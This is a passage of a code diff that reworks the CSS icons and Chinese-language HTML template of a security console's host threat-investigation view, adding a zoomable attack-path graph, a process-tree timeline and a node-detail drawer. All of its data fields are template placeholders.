+.hg-mk.ip{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M13 1L13.001 4.06201C16.6192 4.51365 19.4869 7.38163 19.9381 11L23 11V13L19.938 13.001C19.4864 16.6189 16.6189 19.4864 13.001 19.938L13 23H11L11 19.9381C7.38163 19.4869 4.51365 16.6192 4.06201 13.001L1 13V11L4.06189 11C4.51312 7.38129 7.38129 4.51312 11 4.06189L11 1H13ZM12 6C8.68629 6 6 8.68629 6 12C6 15.3137 8.68629 18 12 18C15.3137 18 18 15.3137 18 12C18 8.68629 15.3137 6 12 6ZM12 10C13.1046 10 14 10.8954 14 12C14 13.1046 13.1046 14 12 14C10.8954 14 10 13.1046 10 12C10 10.8954 10.8954 10 12 10Z"/%3E%3C/svg%3E')}
+.hg-mk.up{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M12 12.5858L16.2426 16.8284L14.8284 18.2426L13 16.415V22H11V16.413L9.17157 18.2426L7.75736 16.8284L12 12.5858ZM12 2C15.5934 2 18.5544 4.70761 18.9541 8.19395C21.2858 8.83154 23 10.9656 23 13.5C23 16.3688 20.8036 18.7246 18.0006 18.9776L18.0009 16.9644C19.6966 16.7214 21 15.2629 21 13.5C21 11.567 19.433 10 17.5 10C17.2912 10 17.0867 10.0183 16.8887 10.054C16.9616 9.7142 17 9.36158 17 9C17 6.23858 14.7614 4 12 4C9.23858 4 7 6.23858 7 9C7 9.36158 7.03838 9.7142 7.11205 10.0533C6.91331 10.0183 6.70879 10 6.5 10C4.567 10 3 11.567 3 13.5C3 15.2003 4.21241 16.6174 5.81986 16.934L6.00005 16.9646L6.00039 18.9776C3.19696 18.7252 1 16.3692 1 13.5C1 10.9656 2.71424 8.83154 5.04648 8.19411C5.44561 4.70761 8.40661 2 12 2Z"/%3E%3C/svg%3E')}
+.hg-mk.srv{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M5 11H19V5H5V11ZM21 4V20C21 20.5523 20.5523 21 20 21H4C3.44772 21 3 20.5523 3 20V4C3 3.44772 3.44772 3 4 3H20C20.5523 3 21 3.44772 21 4ZM19 13H5V19H19V13ZM7 15H10V17H7V15ZM7 7H10V9H7V7Z"/%3E%3C/svg%3E')}
+.hg-mk.proc{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M3 3H21C21.5523 3 22 3.44772 22 4V20C22 20.5523 21.5523 21 21 21H3C2.44772 21 2 20.5523 2 20V4C2 3.44772 2.44772 3 3 3ZM4 5V19H20V5H4ZM12 15H18V17H12V15ZM8.66685 12L5.83842 9.17157L7.25264 7.75736L11.4953 12L7.25264 16.2426L5.83842 14.8284L8.66685 12Z"/%3E%3C/svg%3E')}
+.hg-mk.file{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M15 4H5V20H19V8H15V4ZM3 2.9918C3 2.44405 3.44749 2 3.9985 2H16L20.9997 7L21 20.9925C21 21.5489 20.5551 22 20.0066 22H3.9934C3.44476 22 3 21.5447 3 21.0082V2.9918ZM11 15H13V17H11V15ZM11 7H13V13H11V7Z"/%3E%3C/svg%3E')}
+.hg-mk.more{--ni:url('data:image/svg+xml,%3Csvg viewBox="0 0 24 24" fill="%23000" xmlns="http://www.w3.org/2000/svg"%3E%3Cpath d="M4.5 10.5C3.675 10.5 3 11.175 3 12C3 12.825 3.675 13.5 4.5 13.5C5.325 13.5 6 12.825 6 12C6 11.175 5.325 10.5 4.5 10.5ZM19.5 10.5C18.675 10.5 18 11.175 18 12C18 12.825 18.675 13.5 19.5 13.5C20.325 13.5 21 12.825 21 12C21 11.175 20.325 10.5 19.5 10.5ZM12 10.5C11.175 10.5 10.5 11.175 10.5 12C10.5 12.825 11.175 13.5 12 13.5C12.825 13.5 13.5 12.825 13.5 12C13.5 11.175 12.825 10.5 12 10.5Z"/%3E%3C/svg%3E')}
 </style>
 <style>
 /* hux: 缺省状态 */
@@ -1542,7 +1866,7 @@
             <sc-if value="{{g.open}}" hint-placeholder-val="{{true}}"><div class="hu-gi"><sc-for list="{{g.items}}" as="it" hint-placeholder-count="2"><button type="button" class="{{it.c}}" onClick="{{it.t}}"><span class="hu-itx"><b>{{it.n}}</b><small>{{it.sub}}</small></span><time>{{it.tm}}</time></button></sc-for></div></sc-if></div></sc-for>
             <sc-if value="{{ls.qNone}}" hint-placeholder-val="{{false}}"><p class="hd-mut hd-pad">没有匹配的事件</p></sc-if></div></section></sc-if>
         <sc-if value="{{ls.qOff}}" hint-placeholder-val="{{false}}"><div class="kc-card hu-qo"><button type="button" class="hu-ib" aria-label="展开调查队列" title="展开调查队列" onClick="{{ls.qT}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></button><button type="button" class="hu-qv" onClick="{{ls.qT}}"><span>调查队列</span></button><div class="hu-qhs"><sc-for list="{{ls.railH}}" as="h" hint-placeholder-count="3"><button type="button" class="{{h.c}}" title="{{h.tt}}" onClick="{{h.t}}">{{h.k}}</button></sc-for></div></div></sc-if>
-        <section class="kc-card hu-c">
+        <section class="{{ls.hucC}}">
           <div class="hu-ih"><div class="hu-im"><small class="hu-id">{{ls.inc.id}} · 主机调查</small><div class="hu-tt"><h2>{{ls.inc.n}}</h2><span class="{{ls.inc.lvC}}">{{ls.inc.lv}}</span><span class="{{ls.inc.stC}}">{{ls.inc.st}}</span></div>
             <div class="hu-meta"><span>入口：{{ls.inc.entry}}</span><a href="#" onClick="{{ls.inc.hostGo}}">主机：{{ls.inc.host}} · {{ls.inc.ip}}</a><span>{{ls.inc.first}} — {{ls.inc.last}}</span><sc-if value="{{ls.inc.sla}}" hint-placeholder-val="{{true}}"><span class="{{ls.inc.slaC}}">{{ls.inc.sla}}</span></sc-if></div></div>
             <div class="hu-ia"><span class="{{ls.ownW}}"><button type="button" class="{{ls.ownC}}" aria-haspopup="listbox" aria-expanded="{{ls.ownOn}}" onClick="{{ls.ownT}}"><span>负责人</span><b>{{ls.ownN}}</b><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 13.17l4.95-4.95 1.41 1.41L12 16 5.64 9.64l1.41-1.41z"></path></svg></button><sc-if value="{{ls.ownOn}}" hint-placeholder-val="{{false}}"><div class="dd-m" onClick="{{ls.ownX}}"></div><div class="dd-p" role="listbox" aria-label="负责人"><sc-for list="{{ls.owns}}" as="o" hint-placeholder-count="4"><button type="button" role="option" class="{{o.c}}" onClick="{{o.t}}">{{o.n}}</button></sc-for></div></sc-if></span><button type="button" class="kc-btn pri" onClick="{{ls.planO}}">处置方案</button><sc-if value="{{ls.inc.pend}}" hint-placeholder-val="{{true}}"><span class="hu-pend">{{ls.inc.pend}} 条待研判</span></sc-if></div></div>
@@ -1558,11 +1882,60 @@
                 <p class="hu-asg">处置建议：{{ls.plan.ai}}可在<a href="#" onClick="{{ls.planO}}">「处置方案」</a>中执行。</p></sc-if>
               <a href="#" class="hu-aim" onClick="{{ls.aiT}}">{{ls.aiTN}}<i class="{{ls.aiC}}" aria-hidden="true"></i></a></div><div class="kai-ft"><span>由 AI 根据关联告警和主机行为研判，结论仅供参考</span><span class="kai-fb"><button type="button" aria-label="有帮助" title="有帮助" onClick="{{ls.aiUp}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><path d="M7 10v11H3V10z"></path><path d="M7 10l4-7c1.7 0 2.7 1.2 2.4 2.8L13 9h6.2a2 2 0 0 1 2 2.4l-1.4 7.2A3 3 0 0 1 16.9 21H7"></path></svg></button><button type="button" aria-label="没帮助" title="没帮助" onClick="{{ls.aiDn}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" style="transform:rotate(180deg)"><path d="M7 10v11H3V10z"></path><path d="M7 10l4-7c1.7 0 2.7 1.2 2.4 2.8L13 9h6.2a2 2 0 0 1 2 2.4l-1.4 7.2A3 3 0 0 1 16.9 21H7"></path></svg></button></span></div></div></div>
           <div class="kc-tabs hu-tabs" role="tablist"><sc-for list="{{ls.vtabs}}" as="t" hint-placeholder-count="2"><button class="{{t.cls}}" type="button" role="tab" aria-selected="{{t.on}}" onClick="{{t.pick}}">{{t.n}}</button></sc-for><span class="hu-tip">{{ls.tip}}</span></div>
-          <sc-if value="{{ls.vChain}}" hint-placeholder-val="{{true}}"><div class="hu-cv"><div class="hu-lg"><span><i class="hu-ld r"></i>待研判告警</span><span><i class="hu-ld b"></i>已确认告警</span><span><i class="hu-ld n"></i>普通证据</span></div>
-            <div class="hu-ch"><sc-for list="{{ls.chain}}" as="n" hint-placeholder-count="8"><sc-if value="{{n.arrow}}" hint-placeholder-val="{{true}}"><i class="{{n.ac}}" aria-hidden="true"></i></sc-if><button type="button" class="{{n.c}}" onClick="{{n.t}}" onMouseEnter="{{n.he}}" onMouseLeave="{{ls.hx}}"><span class="{{n.ic}}"><sc-if value="{{n.b}}" hint-placeholder-val="{{false}}"><em>{{n.b}}</em></sc-if></span><b>{{n.n}}</b><small>{{n.s}}</small></button></sc-for></div>
-            <sc-if value="{{ls.brOn}}" hint-placeholder-val="{{false}}"><div class="hu-br"><span class="hu-brl">{{ls.brL}}</span><sc-for list="{{ls.br}}" as="n" hint-placeholder-count="2"><button type="button" class="{{n.c}}" onClick="{{n.t}}" onMouseEnter="{{n.he}}" onMouseLeave="{{ls.hx}}"><span class="{{n.ic}}"><sc-if value="{{n.b}}" hint-placeholder-val="{{false}}"><em>{{n.b}}</em></sc-if></span><b>{{n.n}}</b><small>{{n.s}}</small></button></sc-for></div></sc-if></div></sc-if>
-          <sc-if value="{{ls.vTree}}" hint-placeholder-val="{{false}}"><div class="hu-ptree"><p class="hu-trn">{{ls.trN}}</p><sc-for list="{{ls.tree}}" as="r" hint-placeholder-count="6"><button type="button" class="{{r.c}}" style="{{r.st}}" onClick="{{r.t}}"><i class="hu-ni proc sm" aria-hidden="true"></i><b>{{r.n}}</b><small>PID {{r.pid}}</small><code>{{r.cmd}}</code><sc-if value="{{r.al}}" hint-placeholder-val="{{false}}"><span class="{{r.alC}}">{{r.al}}</span></sc-if></button></sc-for></div></sc-if>
-          <div class="hu-tl"><div class="hu-tlh"><b>告警时间线</b><span>{{ls.tlS}}</span></div><div class="hu-tlb"><sc-for list="{{ls.alerts}}" as="x" hint-placeholder-count="6"><button type="button" class="{{x.c}}" onClick="{{x.t}}" onMouseEnter="{{x.he}}" onMouseLeave="{{ls.hx}}"><time>{{x.tm}}</time><i class="{{x.dc}}"></i><span class="hu-tm"><span class="hu-tmh"><b>{{x.n}}</b><small>{{x.stg}} · {{x.ak}}</small></span><code>{{x.d}}</code></span><span class="hu-tp">{{x.pr}}</span><span class="{{x.sc}}">{{x.st}}</span></button></sc-for></div></div>
+          <div class="{{ls.hg.c}}" data-k="{{ls.hg.k}}" style="{{ls.hg.dockSt}}">
+            <sc-if value="{{ls.hg.fs}}" hint-placeholder-val="{{false}}"><div class="hg-top"><div class="hg-path"><span>威胁调查</span><i>/</i><b>{{ls.inc.id}} · {{ls.inc.n}}</b><i>/</i><span class="hg-mono">{{ls.inc.host}}</span><span class="{{ls.inc.stC}}">{{ls.inc.st}}</span></div>
+              <div class="hg-seg" role="tablist"><sc-for list="{{ls.vtabs}}" as="t" hint-placeholder-count="2"><button type="button" role="tab" aria-selected="{{t.on}}" class="{{t.sc}}" onClick="{{t.pick}}">{{t.n}}</button></sc-for></div>
+              <div class="hg-ctl"><button type="button" class="kc-btn pri" onClick="{{ls.hg.planO}}">处置方案<sc-if value="{{ls.planN}}" hint-placeholder-val="{{true}}"><em class="hg-pn">{{ls.planN}}</em></sc-if></button><button type="button" class="kc-btn" onClick="{{ls.hg.fsT}}">退出全屏<kbd>Esc</kbd></button></div></div></sc-if>
+            <div class="hg-mid">
+            <sc-if value="{{ls.hg.isT}}" hint-placeholder-val="{{false}}"><div class="hgt">
+              <div class="hgt-bar"><label class="hg-q"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="11" cy="11" r="6.5"></circle><path d="M20 20l-4-4"></path></svg><input type="search" placeholder="搜索进程名 / PID / 命令" aria-label="搜索节点" value="{{ls.hg.q}}" onChange="{{ls.hg.onQ}}" onKeyDown="{{ls.hg.onQk}}"></label>
+                <span class="hg-sp"><button type="button" class="{{ls.hg.stC}}" onClick="{{ls.hg.spT}}" aria-haspopup="listbox">{{ls.hg.stN}}<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 9l6 6 6-6"></path></svg></button><sc-if value="{{ls.hg.spOpen}}" hint-placeholder-val="{{false}}"><span class="hg-spl" role="listbox"><sc-for list="{{ls.hg.stgs}}" as="x" hint-placeholder-count="4"><button type="button" role="option" class="{{x.c}}" onClick="{{x.t}}"><span>{{x.n}}</span><em>{{x.k}}</em></button></sc-for></span></sc-if></span>
+                <sc-if value="{{ls.hg.qHas}}" hint-placeholder-val="{{false}}"><span class="hg-qn">{{ls.hg.qn}}</span><button type="button" class="hg-qi" aria-label="上一个" onClick="{{ls.hg.qPrev}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 15l6-6 6 6"></path></svg></button><button type="button" class="hg-qi" aria-label="下一个" onClick="{{ls.hg.qNext}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 9l6 6 6-6"></path></svg></button><button type="button" class="hg-qx" onClick="{{ls.hg.qClr}}">清除</button></sc-if><span class="hgt-sp"></span><span class="hgt-cnt">{{ls.hg.cnt}}</span><sc-if value="{{ls.hg.canF}}" hint-placeholder-val="{{false}}"><span class="hg-mode" role="group" aria-label="显示范围"><sc-for list="{{ls.hg.modes}}" as="x" hint-placeholder-count="2"><button type="button" class="{{x.c}}" onClick="{{x.t}}">{{x.n}}</button></sc-for></span></sc-if><button type="button" class="hgt-fs" onClick="{{ls.hg.fsT}}" title="{{ls.hg.fsN}}" aria-label="{{ls.hg.fsN}}"><sc-if value="{{ls.hg.fs}}" hint-placeholder-val="{{false}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><path d="M9 4v4a1 1 0 0 1-1 1H4M15 4v4a1 1 0 0 0 1 1h4M9 20v-4a1 1 0 0 0-1-1H4M15 20v-4a1 1 0 0 1 1-1h4"></path></svg></sc-if><sc-if value="{{ls.hg.nfs}}" hint-placeholder-val="{{true}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><path d="M4 9V5a1 1 0 0 1 1-1h4M15 4h4a1 1 0 0 1 1 1v4M20 15v4a1 1 0 0 1-1 1h-4M9 20H5a1 1 0 0 1-1-1v-4"></path></svg></sc-if></button></div>
+              <div class="hgt-hd"><span>进程</span><span class="hgt-cm">命令行</span><span>告警</span><span class="hgt-tl" data-a0="{{ls.hg.ta0}}" data-a1="{{ls.hg.ta1}}" title="在这里拖选一段时间可放大"><sc-for list="{{ls.hg.ticks}}" as="x" hint-placeholder-count="5"><em style="{{x.st}}">{{x.t}}</em></sc-for><i class="hgt-sel"></i><sc-if value="{{ls.hg.trOn}}" hint-placeholder-val="{{false}}"><button type="button" class="hgt-trr" onClick="{{ls.hg.trR}}" title="恢复完整时间范围">{{ls.hg.trN}}<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" aria-hidden="true"><path d="M6 6l12 12M18 6L6 18"></path></svg></button></sc-if></span></div>
+              <div class="hgt-bd" role="tree"><sc-for list="{{ls.hg.trs}}" as="r" hint-placeholder-count="8"><div class="{{r.c}}" data-id="{{r.id}}" role="treeitem" onClick="{{r.t}}" onMouseEnter="{{r.he}}" onMouseLeave="{{ls.hx}}"><span class="hgt-nm" style="{{r.ind}}"><sc-if value="{{r.tw}}" hint-placeholder-val="{{false}}"><button type="button" class="{{r.twc}}" aria-label="{{r.twL}}" title="{{r.twL}}" onClick="{{r.twT}}"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true"><path d="M9 6l6 6-6 6"></path></svg></button></sc-if><sc-if value="{{r.dpb}}" hint-placeholder-val="{{false}}"><em class="hgt-dp" title="进程层级">{{r.dpb}}</em></sc-if><i class="{{r.ic}}" aria-hidden="true"></i><b title="{{r.ttl}}">{{r.n}}</b><small>{{r.pid}}</small></span><code class="hgt-cm">{{r.cmd}}</code><span class="hgt-al"><sc-if value="{{r.chip}}" hint-placeholder-val="{{false}}"><span class="{{r.chipC}}"><i></i>{{r.chip}}</span></sc-if></span><span class="hgt-trk"><sc-for list="{{ls.hg.ticks}}" as="x" hint-placeholder-count="5"><i class="hg-gl" style="{{x.st}}"></i></sc-for><sc-if value="{{r.ln}}" hint-placeholder-val="{{false}}"><i class="hgt-ln" style="{{r.lst}}"></i></sc-if><sc-for list="{{r.pts}}" as="p" hint-placeholder-count="1"><button type="button" class="{{p.c}}" style="{{p.st}}" title="{{p.tt}}" onClick="{{p.t}}" onMouseEnter="{{p.he}}" onMouseLeave="{{ls.hx}}"><span>{{p.n}}</span></button></sc-for></span></div></sc-for></div>
+            </div></sc-if>
+            <sc-if value="{{ls.hg.notT}}" hint-placeholder-val="{{true}}"><div class="hg-vp" data-w="{{ls.hg.W}}" data-h="{{ls.hg.H}}" data-sx="{{ls.hg.sx}}" data-sy="{{ls.hg.sy}}" data-o="{{ls.hg.o}}" data-rx="{{ls.hg.rx}}" data-ry="{{ls.hg.ry}}" style="{{ls.hg.bg}}">
+              <div class="hg-world" style="{{ls.hg.tf}}">
+                <svg class="hg-svg" width="{{ls.hg.W}}" height="{{ls.hg.H}}" aria-hidden="true"><sc-for list="{{ls.hg.edges}}" as="e" hint-placeholder-count="6"><g class="{{e.c}}"><path class="hg-l" d="{{e.d}}"></path><sc-if value="{{e.flow}}" hint-placeholder-val="{{false}}"><path class="hg-f f3" d="{{e.d}}" style="{{e.dl}}"></path><path class="hg-f f2" d="{{e.d}}" style="{{e.dl}}"></path><path class="hg-f f1" d="{{e.d}}" style="{{e.dl}}"></path></sc-if></g></sc-for></svg>
+                <sc-for list="{{ls.hg.nodes}}" as="n" hint-placeholder-count="6"><button type="button" class="{{n.c}}" data-id="{{n.id}}" style="{{n.st}}" aria-pressed="{{n.on}}" aria-label="{{n.al}}" onClick="{{n.t}}" onMouseEnter="{{n.he}}" onMouseLeave="{{ls.hx}}"><span class="hg-tag">{{n.tag}}</span><span class="hg-hd"><i class="{{n.ic}}" aria-hidden="true"></i><b data-s="{{n.ns}}">{{n.n}}</b><sc-if value="{{n.chip}}" hint-placeholder-val="{{false}}"><span class="{{n.chipC}}"><i></i>{{n.chip}}</span></sc-if></span><span class="hg-sub">{{n.sub}}</span><span class="hg-well"><code>{{n.w}}</code><em class="{{n.rC}}">{{n.r}}</em></span></button></sc-for>
+                <svg class="hg-svg hg-dots" width="{{ls.hg.W}}" height="{{ls.hg.H}}" aria-hidden="true"><sc-for list="{{ls.hg.dots}}" as="p" hint-placeholder-count="4"><circle class="{{p.c}}" cx="{{p.x}}" cy="{{p.y}}" r="3.5"></circle></sc-for></svg>
+              </div>
+              <div class="hg-ui hg-lg"><span><i class="hg-cd r"></i>待研判</span><span><i class="hg-cd b"></i>已确认</span><span><i class="hg-cd n"></i>证据</span><span class="hg-lgf"><i class="hg-fl"></i>攻击路径</span></div>
+              <div class="hg-ui hg-cnt"><span>{{ls.hg.cnt}}</span><sc-if value="{{ls.hg.canF}}" hint-placeholder-val="{{false}}"><span class="hg-mode" role="group" aria-label="显示范围"><sc-for list="{{ls.hg.modes}}" as="x" hint-placeholder-count="2"><button type="button" class="{{x.c}}" onClick="{{x.t}}">{{x.n}}</button></sc-for></span></sc-if><span class="hg-qa"><button type="button" onClick="{{ls.hg.a_fit}}" data-tip="适配画布" aria-label="适配画布"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M4 9V5a1 1 0 0 1 1-1h4M15 4h4a1 1 0 0 1 1 1v4M20 15v4a1 1 0 0 1-1 1h-4M9 20H5a1 1 0 0 1-1-1v-4"></path><rect x="8.5" y="8.5" width="7" height="7" rx="1"></rect></svg></button><button type="button" onClick="{{ls.hg.fsT}}" data-tip="{{ls.hg.fsN}}" aria-label="{{ls.hg.fsN}}"><sc-if value="{{ls.hg.fs}}" hint-placeholder-val="{{false}}"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M9 4v4a1 1 0 0 1-1 1H4M15 4v4a1 1 0 0 0 1 1h4M9 20v-4a1 1 0 0 0-1-1H4M15 20v-4a1 1 0 0 1 1-1h4"></path></svg></sc-if><sc-if value="{{ls.hg.nfs}}" hint-placeholder-val="{{true}}"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M15 4h5v5M9 20H4v-5M20 4l-6 6M4 20l6-6"></path></svg></sc-if></button></span></div><div class="hg-ui hg-hint" aria-hidden="true">按住 <kbd>⌘</kbd> / <kbd>Ctrl</kbd> 滚动缩放，拖动平移画布</div>
+              <sc-if value="{{ls.hg.big}}" hint-placeholder-val="{{true}}"><div class="hg-ui hg-qb"><label class="hg-q"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="11" cy="11" r="6.5"></circle><path d="M20 20l-4-4"></path></svg><input type="search" placeholder="搜索进程名 / PID / 命令" aria-label="搜索节点" value="{{ls.hg.q}}" onChange="{{ls.hg.onQ}}" onKeyDown="{{ls.hg.onQk}}"></label>
+                <span class="hg-sp"><button type="button" class="{{ls.hg.stC}}" onClick="{{ls.hg.spT}}" aria-haspopup="listbox">{{ls.hg.stN}}<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 9l6 6 6-6"></path></svg></button><sc-if value="{{ls.hg.spOpen}}" hint-placeholder-val="{{false}}"><span class="hg-spl" role="listbox"><sc-for list="{{ls.hg.stgs}}" as="x" hint-placeholder-count="4"><button type="button" role="option" class="{{x.c}}" onClick="{{x.t}}"><span>{{x.n}}</span><em>{{x.k}}</em></button></sc-for></span></sc-if></span>
+                <sc-if value="{{ls.hg.qHas}}" hint-placeholder-val="{{false}}"><span class="hg-qn">{{ls.hg.qn}}</span><button type="button" class="hg-qi" aria-label="上一个" onClick="{{ls.hg.qPrev}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 15l6-6 6 6"></path></svg></button><button type="button" class="hg-qi" aria-label="下一个" onClick="{{ls.hg.qNext}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 9l6 6 6-6"></path></svg></button><button type="button" class="hg-qx" onClick="{{ls.hg.qClr}}">清除</button></sc-if></div>
+              <div class="hg-ui hg-mm" aria-label="小地图，拖动可平移画布"><svg viewBox="{{ls.hg.vb}}" preserveAspectRatio="xMidYMid meet"><sc-for list="{{ls.hg.nodes}}" as="n" hint-placeholder-count="6"><rect class="{{n.mc}}" x="{{n.x}}" y="{{n.y}}" width="{{n.mw}}" height="{{n.mh}}" rx="10"></rect></sc-for><rect class="hg-mmv" x="0" y="0" width="0" height="0" rx="6"></rect></svg></div></sc-if>
+              <div class="hg-ui hg-tb" role="toolbar" aria-label="画布">
+                <button type="button" data-hg="loc" onClick="{{ls.hg.a_loc}}" data-tip="定位到选中节点" aria-label="定位到选中节点"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><circle cx="12" cy="12" r="7"></circle><circle cx="12" cy="12" r="2.2"></circle><path d="M12 2v3M12 19v3M2 12h3M19 12h3"></path></svg></button>
+                <button type="button" data-hg="fit" onClick="{{ls.hg.a_fit}}" data-tip="适配画布" aria-label="适配画布"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M4 9V5a1 1 0 0 1 1-1h4M15 4h4a1 1 0 0 1 1 1v4M20 15v4a1 1 0 0 1-1 1h-4M9 20H5a1 1 0 0 1-1-1v-4"></path><rect x="8.5" y="8.5" width="7" height="7" rx="1"></rect></svg></button>
+                <i class="hg-sep"></i>
+                <button type="button" data-hg="out" onClick="{{ls.hg.a_out}}" data-tip="缩小" aria-label="缩小"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M5 12h14"></path></svg></button>
+                <button type="button" class="hg-zm" data-hg="one" onClick="{{ls.hg.a_one}}" data-tip="重置为 100%" aria-label="重置缩放">{{ls.hg.zp}}</button>
+                <button type="button" data-hg="in" onClick="{{ls.hg.a_in}}" data-tip="放大（⌘/Ctrl + 滚轮）" aria-label="放大"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M5 12h14M12 5v14"></path></svg></button>
+                <i class="hg-sep"></i>
+                <button type="button" onClick="{{ls.hg.fsT}}" data-tip="{{ls.hg.fsN}}" aria-label="{{ls.hg.fsN}}"><sc-if value="{{ls.hg.fs}}" hint-placeholder-val="{{false}}"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M9 4v4a1 1 0 0 1-1 1H4M15 4v4a1 1 0 0 0 1 1h4M9 20v-4a1 1 0 0 0-1-1H4M15 20v-4a1 1 0 0 1 1-1h4"></path></svg></sc-if><sc-if value="{{ls.hg.nfs}}" hint-placeholder-val="{{true}}"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" aria-hidden="true"><path d="M4 9V5a1 1 0 0 1 1-1h4M15 4h4a1 1 0 0 1 1 1v4M20 15v4a1 1 0 0 1-1 1h-4M9 20H5a1 1 0 0 1-1-1v-4"></path></svg></sc-if></button>
+              </div>
+            </div></sc-if>
+            <sc-if value="{{ls.hg.dw}}" hint-placeholder-val="{{false}}"><aside class="hg-dw" aria-label="节点详情"><div class="hg-dwh"><span class="hg-tag s">{{ls.nd.kind}}</span><button type="button" class="hg-x" aria-label="关闭" onClick="{{ls.hg.clr}}"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M6 6l12 12M18 6L6 18"></path></svg></button></div>
+              <div class="hg-dwt"><b>{{ls.nd.n}}</b><span class="{{ls.nd.stC}}">{{ls.nd.st}}</span></div><p class="hg-mono hg-dws">{{ls.nd.s}}</p>
+              <dl class="hg-kv"><sc-for list="{{ls.nd.kv}}" as="x" hint-placeholder-count="4"><div><dt>{{x.k}}</dt><dd class="{{x.c}}">{{x.v}}</dd></div></sc-for></dl>
+              <sc-if value="{{ls.nd.hasCmd}}" hint-placeholder-val="{{true}}"><div class="hg-cmd"><small>{{ls.nd.cmdK}}</small><code>{{ls.nd.cmd}}</code></div></sc-if>
+              <div class="hg-dsec"><b>关键证据<em>{{ls.keyN}}</em></b><sc-for list="{{ls.keys}}" as="x" hint-placeholder-count="1"><div class="hg-key"><span>{{x.n}}</span><time>{{x.tm}}</time><code>{{x.d}}</code></div></sc-for><sc-if value="{{ls.keyNone}}" hint-placeholder-val="{{false}}"><p class="hg-none">这个节点没有直接告警，是攻击路径上的关联证据</p></sc-if></div>
+              <sc-if value="{{ls.nxHas}}" hint-placeholder-val="{{true}}"><div class="hg-dsec"><b>处置<small>加入方案，统一确认后执行</small></b><sc-for list="{{ls.nx}}" as="x" hint-placeholder-count="2"><button type="button" class="{{x.dc}}" onClick="{{x.t}}"><span>{{x.n}}</span><em>{{x.e}}</em></button></sc-for></div></sc-if>
+              <div class="hg-dsec"><b>查询</b><sc-for list="{{ls.nq}}" as="x" hint-placeholder-count="2"><button type="button" class="hg-act" onClick="{{x.t}}"><span>{{x.n}}</span></button></sc-for></div>
+              <sc-if value="{{ls.nd.canPi}}" hint-placeholder-val="{{true}}"><a href="#" class="hg-pi" onClick="{{ls.nd.piGo}}">在主机详情中查看进程调查 ›</a></sc-if></aside></sc-if>
+            </div>
+            <div class="hg-dock"><div class="hg-grip" aria-hidden="true"></div>
+              <div class="hg-dh"><div class="hg-dt" role="tablist"><sc-for list="{{ls.hg.dtabs}}" as="t" hint-placeholder-count="2"><button type="button" role="tab" aria-selected="{{t.on}}" class="{{t.c}}" onClick="{{t.t}}">{{t.n}}<sc-if value="{{t.k}}" hint-placeholder-val="{{false}}"><em>{{t.k}}</em></sc-if></button></sc-for></div>
+                <div class="hg-num"><sc-for list="{{ls.hg.nums}}" as="x" hint-placeholder-count="3"><span><small>{{x.k}}</small><b>{{x.v}}</b></span></sc-for></div>
